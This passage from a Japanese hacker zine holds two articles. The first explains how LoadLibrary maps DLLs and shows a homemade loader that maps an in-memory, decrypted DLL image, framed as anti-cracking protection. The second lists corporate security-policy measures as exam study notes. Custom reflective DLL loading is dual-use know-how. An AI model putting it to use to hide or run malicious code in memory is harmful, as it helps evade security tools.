+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　私は以前「WizardBible vol.15」にて「リバースエンジニアリグ」という記事
+を書きました。そして、この記事の最後の「絶対にKrackされないソフトウェアの
+作り方を考える」にて、マシン語を暗号化したプログラムを内部に入れておき、
+特定のパスワードを入力しなければ任意のコードが復号化されず、結果的に任意
+のコードが実行されないようにするというテクニックを書きました。しかし、こ
+のテクニックは前回の記事で書いた通り、実用性に欠けます。
+
+　そして数ヵ月後くらいに私のところへあるメールが来ました。その内容は「DL
+Lをプロセスへマッピングする処理を自前で作成し、暗号化したDLLイメージを動
+的に復号化して、プロセスへマッピングさせるようにすれば、暗号化しておきた
+いプログラムをDLLとして作成しておくことができ、実用性が大きく増すのではな
+いか？」というものでした。
+
+　つまり「プロセス内にあらかじめ暗号化した状態のDLLイメージを持っておき、
+そのDLLイメージを復号化し自前でプロセスへマッピングできれば、実用的なアン
+チクラッキング対策を行うことができるのではないか？」ということです。
+
+　例えばパッカー（packer）というソフトは任意のEXEファイルを圧縮し、その圧
+縮したデータの先頭に展開コードを追加します。このようなパッカーで処理され
+たファイルも、もちろんPEフォーマットに従っているため実行することができま
+すし、圧縮されるべき元々のEXEファイルもまたPEフォーマットに従っています。
+よって、パッカーが付加した展開コードは圧縮されているEXEファイルを展開し、
+そのEXEファイルをあらためてメモリにロードしているわけであり、これはつまり、
+展開コードがローダー（loader）の役割に担っていることを意味します。
+
+　さて、ローダーを作るならばWindowsAPIのCreateProcessの動作をデバッガで追
+っていけば再現することができます。これと同じように、DLLのマッピング処理は
+LoadLibraryを追っていくことで分かります。今回はこのDLLのマッピングを自前
+で行うプログラムを作成していくことにします。ちなみに、ローダーを自前で用
+意するならば、UPXという有名なオープンソースのパッカーがありますので、その
+辺りはUPXのソースコードを読むことで理解することができると思います。
+
+　今回私が使用する環境は「WindowsXP + VC++.NET」ですが、Windows2000以降な
+らば、問題ないでしょう。
+
+
+■0x02.) LoadLibrary(Ex)関数の定義
+
+　LoadLibrary関数はMSDNにて以下のように定義されています。
+
+-----  LoadLibrary関数
+HINSTANCE LoadLibrary(
+    LPCTSTR lpLibFileName    // DLLファイル名
+);
+-----
+
+　lpLibFileNameにDLLファイル名を指定し、DLLのマッピングが成功したら戻り値
+としてDLLハンドルを、失敗したらNULLを返します。このLoadLibrary関数を拡張
+したのが、LoadLibraryEx関数です。
+
+-----  LoadLobraryEx関数
+HMODULE LoadLibraryEx(
+    LPCTSTR lpLibFileName,    // DLLファイル名
+    HANDLE hFile,             // NULL固定
+    DWORD dwFlags             // フラグ
+);
+-----
+
+　hFileはNULLで固定です。dwFlagsはフラグで以下のどれかを指定します。
+
+・DONT_RESOLVE_DLL_REFERENCES
+・LOAD_LIBRARY_AS_DATAFILE
+・LOAD_WITH_ALTERED_SEARCH_PATH
+
+　これらの詳細は説明はMSDNを参照してください。
+
+
+■0x03.) LoadLibrary(Ex)関数の動作
+
+　では、いったいLoadLibrary関数は内部でどのような処理を行っているのでしょ
+うか？　まずはそれを考えてみます。ちなみに、このテキストではLoadLibraryと
+LoadLibraryExを同じものと考えていますが、それはLoadLibraryは、内部的に以
+下のように呼び出していると推測しているからです。
+
+-----
+LoadLibrary("test.dll")      →      LoadLibraryEx("test.dll", NULL, 0)
+                         内部的には
+-----
+
+　このことから、以後LoadLibraryとLoadLibraryExは同一のものとして話を進め
+ていきます。
+
+　プロセス内でLoadLibraryが呼び出された時、まず一番最初に、LoadLibraryは
+該当するDLLがすでにマッピングされていないかどうかを調べます。もしマッピン
+グされていたら、新しくマッピングする必要はないためそのDLLのハンドルを返却
+して終了です。もしマッピングされていなかったならば、まずはDLLイメージをプ
+ロセスのメモリへマッピングします。この時にOpenFileMapping関数やCreateFil
+eMapping関数を使用します。
+
+-----
++---------+-----+          +-----+
+|         |     |   <--    |     |
+|         |     |   <--    |     |
+| Process | DLL |   <--    | DLL |
+|         |     |   <--    |     |
+|         |     |   <--    |     |
++---------+-----+          +-----+
+
+　 プロセスへのマッピング処理
+-----
+
+　このマッピング時にLOAD_LIBRARY_AS_DATAFILEフラグが指定されているならば、
+DLLのマッピングのみを行いここで終了します。それ以外の場合は、次にインポー
+トアドレステーブルの解決を行います。DLL自体ももちろん他の様々なDLLや関数を
+利用しているためそれらのアドレス解決を行います。インポートアドレステーブル
+に利用しているDLLや関数名が存在するので、それを調べて、適切なアドレスを設
+定していきます。さらに必要ならば再配置テーブルも処理します。
+
+-----
++---------+-----+          +--------------+
+|         |     |  ------> | kernel32.dll |
+|         |     |          +--------------+
+| Process | DLL |  ---+
+|         |     |     |    +--------------+
+|         |     |     +--> |  user32.dll  |
++---------+-----+          +--------------+
+
+　DLLが利用しているDLLのインポート関数アドレスを解決
+-----
+
+　これで、とりあえずDLL内のプログラムは実行できる状態になったので、今度は
+DllMain関数を呼び出します。DllMain関数は「DLLのアタッチ時」「DLLのデタッ
+チ時」「スレッド起動時」「スレッド終了時」に呼び出さなければなりません。
+とりあえずは、一番最初の「DLLのアタッチ時」として、DllMainを呼び出します。
+またDONT_RESOLVE_DLL_REFERENCESフラグが立っていれば、DllMain関数の実行は
+行いません。
+
+　次にDLLイメージのプロテクトを行います。現在DLLイメージはメモリ上に展開
+されています。そしてセクションによっては読み込みのみでよい部分もあれば、
+読み書きが必要な部分もあります。そのため、セクションによってメモリプロテ
+クト行います。
+
+-----
++---------+-----+
+|         |     | <-- read & write
+|         +-----+
+| Process | DLL | <-- read & exec
+|         +-----+
+|         |     | <-- read only
++---------+-----+
+
+　メモリプロテクトの実行
+-----
+
+　ここまでで、一応DLLのマッピング部分は終わりです。次に、現在マッピングし
+ているDLLを管理しなければならないため、DLLのデータベースを作成します。デ
+ータベースに設定するパラメータデータには、「DLLのイメージベースアドレス」
+「DLLファイル名」「フラグ」「ロックカウンタ」そして「次のパラメータデータ
+のアドレス」を設定します。
+
+　LoadLibraryが呼び出され、プロセスへマッピングするDLLが増えるたびにDLLの
+パラメータデータを追加していき、ここを参照して、DLLの管理を行います。また
+FreeLibraryが呼び出されたらDLLのマッピングを解除しなければならないので、
+データベースからデータを削除し、DLLのために割り当てていたメモリを開放しま
+す。
+
+　以上がLoadLibraryの一通りの動作です。案外大したことはやってなかったりし
+ます（笑）。
+
+
+■0x04.) プログラミング
+
+　以下が、検証プログラムです。
+
+http://ruffnex.oc.to/kenji/text/load_dll/test_exe.cpp（ソースコード）
+http://ruffnex.oc.to/kenji/text/load_dll/load_dll.zip（全パッケージ）
+
+　まずはサンプルとなるDLLを作成します。このDLLがちゃんとプロセスにマッピ
+ングされ、内部の関数を実行することができたならば、LoadLibraryは成功してい
+ることになります。
+
+-----  test_dll.cpp（http://ruffnex.oc.to/kenji/text/load_dll/test_dll.cpp）
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <windowsx.h>
+#include <tchar.h>
+
+#define EXPORT extern "C" __declspec(dllexport)
+
+EXPORT int add_num(int a, int b) { return (a + b); }
+EXPORT int sub_num(int a, int b) { return (a - b); }
+
+BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBox(GetActiveWindow(), 
+            _T("Process Attach!"), _T("Message"), MB_OK);
+        break;
+    case DLL_THREAD_ATTACH:
+        MessageBox(GetActiveWindow(), 
+            _T("Thread Attach!"), _T("Message"), MB_OK);
+        break;
+    case DLL_THREAD_DETACH:
+        MessageBox(GetActiveWindow(), 
+            _T("Thread Detach!"), _T("Message"), MB_OK);
+        break;
+    case DLL_PROCESS_DETACH:
+        MessageBox(GetActiveWindow(), 
+            _T("Process Detach!"), _T("Message"), MB_OK);
+        break;
+    }
+    return TRUE;
+}
+-----
+
+　このDLLを作成した状態で、test_exe.cppをコンパイルし、実行します。test_
+exe.cppのWinMain関数は以下のようになっています。
+
+-----
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPTSTR    lpCmdLine,
+                     int       nCmdShow)
+{
+    InitializeDLLLoad();
+    HMODULE hHandle = LoadDLL(_T("test_dll"));
+    PADDFUNC pAdd = (PADDFUNC)GetDLLProcAddress(hHandle, _T("add_num"));
+    int a = (*pAdd)(3, 5);  // 3 + 5 = 8
+    PSUBFUNC pSub = (PSUBFUNC)GetDLLProcAddress(
+        GetDLLHandle(_T("test_dll.dll")), _T("sub_num"));
+    int b = (*pSub)(8, 5);  // 8 - 5 = 3
+    TCHAR szFileName[MAX_PATH];
+    GetDLLFileName(hHandle, szFileName, sizeof(szFileName));
+    TCHAR szBuffer[1024];
+    wsprintf(szBuffer, _T(
+        "FileName = %s\r\na = %d, b = %d\r\n"), szFileName, a, b);
+    MessageBox(GetActiveWindow(), szBuffer, _T("Message"), MB_OK);
+    FreeDLL(hHandle);
+    KillDLLLoad();
+    return 0;
+}
+-----
+
+　まず最初にInitializeDLLLoad、最後にKillDLLLoadを確認してください。これ
+ら2つの関数は必ず必要です。
+
+　まずはLoadDLLでtest_dllをマッピングします。そして、GetDLLProcAddressを
+使ってDLL内の関数アドレスを取得します。そのアドレスを使って関数を呼び出し、
+足し算や引き算の計算を行います。さらにGetDLLHandle関数を使ってマッピング
+しているDLLのハンドルが取得でき、GetDLLFileName関数を使ってマッピングして
+いるDLLファイル名の取得ができます。このようにして、DLLをマッピングし、使
+用することが可能です。
+
+　動作の詳しい内容はソースコードを読んでください。いや、ここで全部解説し
+てもよいのですが、800行程度もあるため、WizardBibleがそのまま800行長くなり、
+さらにずっとソースコードの解説というものあまり好まれないようなので…(^^;。
+
+　プログラムを実行すると、LoadDLLにより、DLLマッピング時の処理が行われま
+す。つまり、メッセージボックスで「Process Attach!」が表示されます。次に、
+GetDLLProcAddressで関数アドレス、GetDLLFileNameでファイル名を取得して、そ
+れをメッセージボックスで表示しているため、「FileName = test_dll.dll」「a
+ = 8, b = 3」と表示されます。そしてFreeDLLにて、マッピングが解除されるた
+め「Process Detach!」と表示されて終了です。
+
+
+■0x05.) 問題点と可能性
+
+　上記のプログラムですが、通常のLoadLibraryとは以下の点に違いがあります。
+
+・LoadDLLExはLOAD_WITH_ALTERED_SEARCH_PATHフラグをサポートしていません。
+・DLL_THREAD_ATTACHとDLL_THREAD_DETACHをサポートしていません。
+・バグがたくさんありそうです。
+
+　よって、これらを解決するのが今後の課題になってきます。というか、誰か改
+良してください(^^;。
+
+　ただし、現在の状態でもDLLをマッピングする上で十分であることは確かです。
+そして、このテクニックを使えば、例えば暗号化した状態のDLLをメモリ内部に持
+っておき、特定のパスワードによって復号化を行ってマッピングを行うというこ
+とが可能になり、十分にクラッキング対策になると思います。
+
+　もちろんクラッキング対策としてもっとも有効な手段はパッカーを使うことで
+すが、このように、単純にどうやったら対策が行えるかを考えるというのは楽し
+いものだと思います。
+
+
+■0x05.) さいごに
+
+　さて、いかがだったでしょうか。最近あまり役に立たないことばっかり研究し
+てる気がするんですが、今回も案の定あまり役に立たないテクニックだったかも
+しれません(^^;。自分の好きなことややりたいことはたくさんあるのですが、そ
+ういうものに限って、他人にとってはどうでもよい技術だったりするんです。こ
+れが一般的に言われるスランプというものなのか、はたまた、ただ自分が変人な
+だけなのか分かりませんが、どちらにしろ、私は自分が興味を持ったものしかや
+れない人なので、残念ですが、このまま突き進んでしまいそうです（笑）。だか
+らこそ私の記事を読んでくださる読者の方には本当に感謝しております。さて、
+最後になりましたが、ここまで読んでくれて本当にありがとうございます。
+
+　では、また会う日まで...
+
+
+■0x07.) 参考サイト
+
+・bo2k.com（http://www.bo2k.com/）
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第8章: 企業内過剰防衛マニュアル ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　企業内におけるセキュリティを強化する方法を羅列してみた。さすがに全部を
+実行するのは普通の企業にはやりすぎかもしれない。しかし、セキュアドの午後
+問題や来春のテクニカル・セキュリティ試験の午後問題にはやりすぎというぐら
+いのほうが模範解答に近づく。実際に企業内セキュリティに興味がある人はもち
+ろん、午後試験対策に悩んでいる人は一読してみるとよいだろう。
+
+# 実は、セキュアド対策に作ったノートをWBのネタに使いまわしているだけ。
+
+
+■0x02.) 情報セキュリティ
+
+●情報セキュリティ対策委員会関連
+
+・情報セキュリティ対策委員会は各部門から最低1名ずつ任命する。
+・他の部門の実情を踏まえ、現実的な提案をする。
+・各々の意見の微調整を行う。
+・他社のポリシーを参考にするのは効率がよいが、企業に固有の事情がある場合
+（特殊なネットワークや機器を制御しているなど）は自分たちでセキュリティポ
+リシーを作るべき。
+
+●情報セキュリティポリシー
+
+・企業が情報を保護するにあたっての目的や意図、基本方針をわかりやすく明文
+化したもの。
+・「情報セキュリティ基本方針」と「情報セキュリティ対策基準」を含めたもの。
+・情報セキュリティ基本方針では、「機密情報の漏洩」「プライバシーの侵害」
+があってはいけないこととしている。
+　これらのことを防止するためには、「情報の機密度・重要度の明確化」「セキ
+ュリティ規定に準拠して行動」「情報を外部に漏らさない」ことが重要だ。この
+3つは暗記しておくと後が楽。
+・管理体制を一元化しないと、それぞれが把握していないことが起こる可能性が
+ある。例えば、片方が勝手にバックドアを設置したり、ファイアウォールのProx
+y機能をONにしたりなどである。
+・従業員のセキュリティ意識のレベルが低いと、情報セキュリティポリシーの教
+育を実施してもさほどの効果は期待できず、最大の障害といえる。
+・新しいセキュリティポリシーに変更する際に、新しい問題が生じるときは、変
+更の前後の違いを吟味する。例えば、メールの暗号化によってウイルスチェック
+ができなくなることや、RASやファイアウォールなどのネットワーク構成の変更に
+よって新しいアタックの可能性などがそうだ。
+・新しいセキュリティポリシーの策定と同時にウイルス対策を強化することがあ
+る。その際、作業が間に合わないという状況がないように注意する。
+・他社のセキュリティポリシーを真似しない理由のひとつとしては、独自ネット
+ワーク（プラントなど）の可用性を確保して、我々の会社固有の事情に即したセ
+キュリティポリシーを作成するためであったり、個々のセキュリティ意識を高め
+全社的な取り組みを行うためである。
+
+●セキュリティ管理者、情報アクセス管理者、ネットワーク管理者
+
+・システム管理者はコンピュータシステムの運用・保守を担当する責任者であり、
+セキュリティ管理者と兼任させないほうがよい。
+・従業員が個人データなどの機密度の高いデータにアクセスする場合には、その
+都度、情報セキュリティ管理者の許可を得ると決められているとする。その場合
+は、情報アクセス管理者が一人の場合、不在のとき個人データにアクセスできな
+い。これを解決するためには、もう一人情報アクセス管理者として任命し、必要
+と思われる従業員に個人データのアクセス権限を付与することが必要である。
+・複数のネットワーク管理者がいると、意見が食い違う。その際、それぞれの実
+情を踏まえ、現実的な提案をすることが重要である。また、情報セキュリティ委
+員会で意見の調整をする。
+　実際には、管理者はひとりに統一した方が、一元管理しやすく、問題になりに
+くい。
+
+●情報資産（この言葉を覚えておくこと）
+
+・会社の情報資産の保全に努める。
+・リスク分析で、情報資産に対する脆弱性を洗い出す。
+・情報資産ごとに目標とするセキュリティレベルを明確にする。レベルを設定す
+るには、そもそも何が情報資産なのかを洗い出す必要がある。
+・情報資産には全社的な共通のものと各部署固有のものがある。したがって、情
+報資産の管轄と責任者を明確にしておく。
+
+●情報セキュリティの向上には
+
+・社員のセキュリティ意識を高め、規程を遵守させる。
+・セキュリティ意識を十分に認識させる社員教育を行う。
+・事故やトラブルが発生した際の対処手順をマニュアル化しておく。これにより
+迅速な対応ができる。
+・社員のセキュリティに関する意識が低いと、報告すべきことを怠ったりする。
+これをなくすために、啓蒙しなければならない。
+・定期的にセキュリティ講習会を催し、全員参加にする。ただし、部門や役職ご
+とにレベルや意識差があるので、別々に行う方法もある。
+　講習会は一方的な通告や講師が話をするというものではなく、会談のようなも
+ので参加者全員が理解するように努める。
+
+●社員教育
+
+・不正アクセスやウイルス感染、怪しい挙動を発見したら、上司に報告。上司は
+セキュリティ管理者に報告し、指示を仰ぐ。
+　決して、発見者自らが対処したりしないこと。最悪の場合、ウイルス被害の拡
+散や重要なデータを消去してしまう2次トラブルが起こる可能性がある。
+・課長は所属する部門の業務を熟知しているので、その職場においてどの情報が
+重要なのか、その重要度に応じて、職場の言葉で、仕事の実態に即した説明がで
+きることが考えられる。また、その業務特性や職場特性による情報流出の可能性
+を具体的に説明できると考えられる。
+・教育効果を上げるためには、熟練度に応じた教育を行いやる気をなくさせない
+ようにすること（レベルの高い受講者にとっては時間の無駄であり、レベルの低
+い受講者は内容がまったく理解できないということが起こりかねない）、断続的
+に受講できるスケジュールでレベルの向上を図ること（一気に集中して教育を実
+施すると短期間ですぐに忘れてしまう可能性がある）、受講状況を掌握して教育
+を進めるためのフォローとサポートを行うこと（進歩に遅れがある受講者がいれ
+ば、なぜ遅れているのかその原因を究明する。理解できなくて進まないのであれ
+ば、別途解説する機会を設ける。また、時間が取れないのであれば、その上司と
+相談する）などがある。
+・情報セキュリティポリシーを改善した後では、改善前と後の異なる部分を教育
+内容に盛り込むこと。例えば、アクセス管理が強化されたこと、罰則規定が設け
+られたこと、セキュリティを定期評価すること、情報の管理が強化されたことな
+ど。
+
+●社内からの情報漏洩対策
+
+・上司がメールの内容をチェックする。例えば、社外にメールを送信するときは、
+BCCで上司に控えの同じメールを送信しないと、メールサーバーではじかれるよう
+な設定など。
+　ただし、デメリットも色々ある。暗号化されていると内容がチェックできない。
+ウイルス対策がきちんとされていないと上司にまでウイルス感染の恐れがある。
+上司がすべてのメールをチェックするのが負担になる。機密レベルに応じて、メ
+ールを送信できるかという課題。
+・就業規則の罰則を設けるのは重要だが、単に罰則を強化しても外部の者が自由
+に出入りしていると意味がない。
+・情報が漏洩していることに気付かない状況は一番怖い。
+　また、従業員が情報の外部流出の増大に対して無関心であることも同様である。
+
+●リスク対策
+
+・リスク回避とは、リスクの発生源を絶つこと。被害規模が大きく、発生頻度が
+低いリスクに行う。
+・リスク移転とは、資金的なリスクを保険会社などの第三者へ移転すること。被
+害規模が大きく、発生頻度が低いリスクに行う。
+・損失予防とは、リスクの発生頻度を低減させること。被害規模が小さく、発生
+頻度が高いリスクに行う。
+・リスク保有とは、資金的リスクを自らの財務力で自己負担すること。被害規模
+が小さく、発生頻度が低いリスクに行う。
+
+●不正競争防止法
+
+・公然と知られていない情報のうち、事業活動に有用であり秘密として管理され
+なければならない。
+・法的に不正使用を差し止めるには、まずどの情報が有用かつ非公知なのかを明
+確にするため、秘密情報とそれ以外のものを区別する。
+　次に、秘密として管理するため、アクセスを制限し（アクセスコントロール）、
+許可された者だけがその秘密情報を見ることができるようにする。
+
+●個人情報、JIS Q 15001
+
+・預託は、事業者が当該事業者外のものに情報処理を委託するなどのために自ら
+保有する個人情報を預けること。
+・預託するときは、顧客（個人情報提供元）に同意を得ると同時に、預託先の個
+人情報の保護水準を満たしていることを確認する。
+　個人情報の預託を行うことが予定されている場合は、そのことを情報主体に通
+知することが必要とされている。
+・電子データ以外の紙文書も台帳管理する。
+・利用する目的と利用する情報の範囲がそれぞれ異なるので、顧客情報について
+検討しなければならない。
+・新サービスに移行する際は、個人情報の管理者、収集目的などを情報主体に通
+知して、同意を得る。もし拒否された場合は、これに応じる。
+・個人情報は、正確かつ最新の状態で管理する。
+・個人情報は、不正アクセス、改ざんなどの脅威に対して安全対策を講ずる。
+・情報主体から自己の情報開示を求められ、開示した結果、誤った情報が合った
+場合に、それを訂正または削除する具体的方法を決めておく。
+・個人情報は秘匿化し、外出先からこれをダウンロードする場合は情報セキュリ
+ティ責任者の了承を得る。
+・個人情報が漏洩したら、事件の概要（いつ何が起こったのか、何で情報漏洩が
+起こったのか）、漏れた個人データ項目（具体的な項目）、今後起こる可能性の
+ある事故とその場合の注意点（架空請求やDMなどに悪用される可能性があること、
+その場合は無視すること）について説明をした文書を公開する。サイトで公開す
+るだけでなく、当該者には郵便で連絡する。
+
+●CP（コンプライアンスプログラム）
+
+・CPはPDCAサイクル。
+・CPを作成した後、CPの内容を全従業員に周知徹底する必要がある。そのために
+は研修が有効。そうしないと、せっかく作成したCPが機能しなかったり、CPの内
+容が社内に浸透しない。
+・その上で、CPが遵守されているかどうかの確認を定期的に行う必要がある。こ
+の確認作業を監査という。
+　CPの運用上の監査を怠ると、CPが正しく運用されないという問題が起こる。
+・CPの要求事項として「保護すべき対象」というものがあるが、アンケートなど
+の個人情報、取引先の個人情報だけでなく、社内の社員の個人情報も適応範囲。
+つまり、人事課（人事部）にも個人情報管理の台帳記入を依頼しなければならな
+い。
+
+●ISMS
+
+・特定システムオペレーション企業（システムオペレーションサービスを的確に
+遂行できる企業）の申請をする場合、ISMS認証の取得が必要条件になっている。
+・官公庁などで調査した個人票を入力するような業務を委託する場合、その委託
+先の業者はプライバシーマークかISMSの認証取得が必須になりつつある。
+・TRUSTeはオンライン上の個人情報が保護対象。プライバシーマークは個人情報、
+ISMSは情報資産が保護対象になる。
+・BS7799（英国）→ISMS（国内）
+　これは第1回・個人情報保護士認定の試験にも出題された。
+・BS7799は2部構成。
+　第1部→ISO/IEC 17799（国際標準化）→JIS X 5080（国内）。
+　第2部（BS7799-2:2002）→ISMS認証基準Ver2.0（国内）
+・ISMS認証基準Ver2.0の作成時、日本語の翻訳のときの用語はJIS X 5080を活用
+しているので、JIS X 5080と互換性が確保されている。
+・ISMS認証基準Ver2.0は、Ver1.0より運用プロセスにISOマネジメントモデルを導
+入してあり、ISO9001やISO14001と親和性が高くなっている。
+・BS7799とISMSの同時認証取得を狙うなら、審査登録機関として英国の認定機関
+UKASやオランダの認定機関RVAなどから認定を受けている審査登録機関を選ぶ。
+・ISMSの審査は文書審査と実地審査の2ステージがある。
+・審査の過程で不適合が見つかれば、是正処置を行う。
+・リスク識別・リスク対応の際に、リスクアセスメント実施基準に従ってインプ
+ットすることで、アウトプットが透明化される。
+・リスク分析手法には、ベースラインアプローチ（現状の管理レベルとベースラ
+インとなる対策の基準とのギャップをどれぐらいあるかそれぞれギャップ分析を
+行う手法）、非形式アプローチ（組織や担当者の経験や判断によってリスクを評
+価する手法）、詳細リスク分析（システムに対して詳細なリスクアセスメントを
+行う手法）、組み合わせアプローチ（複数のアプローチを併用する手法）の4種類
+がある。
+
+●アウトソーシング、外部委託関連
+
+・「事故後の責任分担」「契約終了時の個人情報の返却・消去」「個人情報に関
+する機密保持（守秘義務）」「再委託に関する事項」を契約時にあらかじめ決定
+し、合意させる。
+　契約書などの書面またはこれに代わる記録を、個人情報の保有期間にわたって
+保存する。
+・セキュリティポリシーを委託先の全社員に周知徹底させる。
+　具体的な対策は、実際の業務の中で契約項目をどのようにして実現していくの
+か、といった実施手順や規定などを作成させることである。
+・PCをレンタルしていてリース期間をすぎて、PCを返却するときは、業務で使用
+したデータ（個人情報などの重要データはもちろんのこと）を完全に削除してか
+ら引き渡す。その際、普通のフォーマットではなく、物理フォーマットをするか
+専用の消去ソフトを使う。
+・外部への業務委託のチェック体制としては、委託先に管理者を置くだけでは不
+満足。業務委託先の情報セキュリティの管理状況を把握しなければならない。例
+えば、業務委託先でセキュリティ事故などがないかどうか、セキュリティポリシ
+ーが遵守されているかどうかなどを確認する。
+・請負事業者との契約書にはリスクマネジメントに関する条項を盛り込む。相手
+事業者に起因するリスクは相手事業者に移転できると判断できる条項の存在が重
+要。
+・外部の派遣社員であっても、セキュリティポリシーや実施手順を遵守する義務
+が発生する。派遣会社はこれを認識し、派遣社員に遵守させる必要があること、
+派遣社員はそのための教育を受け、遵守することに同意すること、ポリシーが遵
+守されなかった場合の規定（損害賠償等）などを契約書に明記する必要がある。
+
+●情報セキュリティ対策基準関連
+
+・新しいシステムを運用する上で、現状の情報セキュリティ対策基準と不適合を
+起こす項目がある。例えば、ネットワーク接続の項目（新しいシステムではRASを
+導入した場合、k公衆電話網も適応範囲になるはず）、対象情報システム範囲の項
+目（他社のサービスを利用するときは、それも適応範囲になる）など。他にはPC
+の廃棄、文書の廃棄の部分にも注目。
+
+
+■0x03.) メール関連
+
+・メール利用に関する社員教育やマニュアルを作成する。
+・メールからウイルスに感染することは多いが、それ以外の感染ルートもありえ
+る。
+　社外で使用したノートPCを社内LANに接続して感染したり、ブラウザでインター
+ネット上のWebページを閲覧したときに感染したりする。前者の対策としては、社
+外ではノートPCを業務以外（例えば業務用サーバー、業務のためのメール）で使
+わないことが一番理想。後者の対策としては、ブラウザ閲覧にも対応するウイル
+ス対策ソフトを導入するか、怪しいサイトにはアクセスしないこと、コンテンツ
+フィルタリングで怪しいサイトにアクセスさせないことなどがある。
+　他にも感染ルートはFDやUSBフラッシュメモリ、DLしたデータからもありえる。
+・POPは暗号化されない。つまり、Snifferで一発でパスワードが抜かれてしまう。
+・メールの内容をチェックする旨は、全社員に通知し、同意を得る。インターネ
+ットでの送受信内容も同様。
+・情報漏洩のチェックのために、社外宛てのメールを送信の際には上司にBCCで同
+じメールを送信する規定も考えられる。しかし、ひとつひとつチェックする上司
+の労力喪並大抵ではない。かといって、いいかげんにチェックしたのでは情報の
+秘匿の管理には役立たない。つまり、最も心配されるのは、上司がすべてのメー
+ルをさばききれなくなるという点である。
+　必ず上司へ控えを送ることや、もし送り忘れた場合には送信されてないといっ
+た新しい仕組みが全社員に浸透し滞りなく運用されるようにするには、こうした
+面倒な手続きをとることの狙いは何なのかを徹底し、どのように運用したらよい
+かを教育する必要も出てくる。
+
+●スパム
+
+・スパム防止として、POP before SMTP、SMTP Authentication（SMTP AUTH）など
+がある。
+　前者はSMTP利用前にPOP認証を行うことで、後者はSMTP自体に認証機能を持たせ
+たものである。
+・SPAMがメールサーバーのキュー（送信・受信）に溜まってしまった場合、それ
+らを削除する。その際、業務に関係するメールを間違えて削除しないようにする。
+最後にメールサーバーを再起動する。
+
+●DM
+
+・DMの送付は管理者だけできるようにして、送信前には必ずウイルス対策ソフト
+でウイルスチェックを行う。
+・消費者にDMを送る趣旨を理解してもらう。
+・DM送付時以外の目的でメールアドレスを利用しないこと。
+
+
+■ウイルス関連
+
+・ウイルスの定義は、自己伝染機能、潜伏機能、発病機能の3つを満たすプログラ
+ム。
+・昔のウイルスはFDのブートセクタ、実行形式ファイル（ロードモジュール）に
+感染したが、最近のものは多種多様である。ブラウザでWebページにアクセスした
+だけで感染するものもある。
+・ウイルスによっては、クライアントとサーバー両方に感染しようとするタイプ
+がある。厳密にはウイルスではなくワームだが、MS Blasterなど。
+・マクロウイルスを実行してしまうと、新たに開くドキュメントファイル（マク
+ロが搭載できるファイル）に感染していく。
+・LAN内や顧客（メーラーのアドレス帳に登録されているメールアドレス）に対し
+て、ウイルスが蔓延することがある。
+　よって、ウイルスが発見されたら、セキュリティ管理人はすぐにそのマシンを
+ネットワークから物理的に切断して、社内LANのクライアントPCに感染していない
+か、サーバーにアタックされていないかログをチェックする。
+・メールを開くときにウイルス検出の警告メッセージが表示されたら、すぐに管
+理者に報告するべき。その際、メールの送信元、メールの内容（内容からウイル
+ス名やデマメールを判断できることもあるため）、ウイルス検出時のPC状況、警
+告メッセージ内容などを報告する。
+・メール以外からの感染も想定しておくこと。例えば、FDやCD-ROM、ノートPC、
+さらにはブラウザで閲覧しただけで感染するウイルスもある。
+
+●ウイルス対策
+
+・メールを扱う場合はウイルスチェックを行う。
+・ノートPCには必ずウイルス対策ソフトを導入する。
+・あらかじめインストールされたウイルス対策ソフトを、ユーザーが勝手にアン
+インストールしないこと。
+・定期的にウイルス定義ファイル（パターンファイル）を更新する。その機能を
+パターンファイル自動更新機能という。
+　さらに、深刻なウイルス情報が出たら、手動ですぐに更新する。これは次の更
+新までの間に新種のウイルスが出回った場合、感染の危険性があるからである。
+・サーバーにインストールするタイプやメールサーバーを監視するタイプなどの
+ウイルス対策ソフトがある。
+・ウイルス対策ソフトで駆除が完了したり、ウイルスが発見されなくても、完璧
+に安全とはいえない。ウイルス定義ファイルに載っていないウイルスの存在があ
+るからだ。
+・ウイルスを発見したら、すぐに上司または情報セキュリティ管理者に報告しな
+ければならない。
+・パターンファイル配布サーバーをLAN内に設置すれば、ネットワークが混雑しな
+くて済む。また、ログをチェックすることできちんとパターンファイルをDLして
+いるかどうかをチェックできる。
+・トロイの木馬に感染したら、復旧手順として最終的にソフトウェアのすべてを
+再インストールするのがよい。極端にいえばOSごと再インストールが安心。
+　つまり、ひとつ見つかったら、そのホストの他のソフトにも感染していないか
+疑わなければならない。
+・役割分担を決めて、組織が一丸となってウイルス対策を行う。ひとりでも怠る
+人がいると、そこから感染してしまう。実際そのような例が多い。
+・デマメールを信じて必要なファイルを削除しないこと。きちんと上司への報告
+を守れば、削除してしまうという問題は起きないはず。
+・現時点でのアンチウイルス製品のバージョン、機能の範囲などの確認。最新版
+の入手方法の確認などを行う。
+・部門ごとにウイルス対策責任者を置く。しかしこれだけでは不十分である。ユ
+ーザーがセキュリティポリシーにしたがって行動しなければならない。そこで、
+社員に対してウイルス対策を含むセキュリティ対策について教育と啓発を行う。
+・外部（例えばISP）のメールサーバーを利用するときは、必ずメールのウイルス
+検査を行うべき。
